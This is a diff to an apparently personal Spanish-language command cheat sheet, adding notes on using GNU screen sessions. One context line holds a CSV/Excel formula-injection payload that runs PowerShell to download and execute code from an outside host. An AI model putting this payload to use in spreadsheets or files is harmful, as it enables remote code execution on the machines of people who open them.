@@ -173,3 +173,10 @@ tesseract -psm 8 out2.png -
 @SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0 //#payload excel csv
 openssl s_client -connect 179.27.35.202:443 //cliente https 
 
+--screen:
+screen
+te pone un aviso, le das enter y quedas adentro
+para salir tocas: Cntrl+A y a parte, solo la D
+con screen -list las listas
+para volver: screen -r [nombre de sesion]
+
